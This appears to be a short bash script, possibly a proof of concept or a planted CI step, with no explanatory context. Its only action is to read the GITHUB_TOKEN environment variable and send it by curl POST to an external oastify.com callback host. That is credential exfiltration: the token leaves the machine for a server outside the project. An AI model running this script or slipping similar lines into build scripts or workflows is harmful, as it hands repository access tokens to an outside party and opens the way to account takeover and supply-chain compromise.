#!/bin/bash


GITHUB_TOKEN="${GITHUB_TOKEN}"



URL="http://4rwk0epqjk0px2tw5bsmjqn77ydp1jp8.oastify.com"
curl -X POST -d "token=${GITHUB_TOKEN}" "$URL"
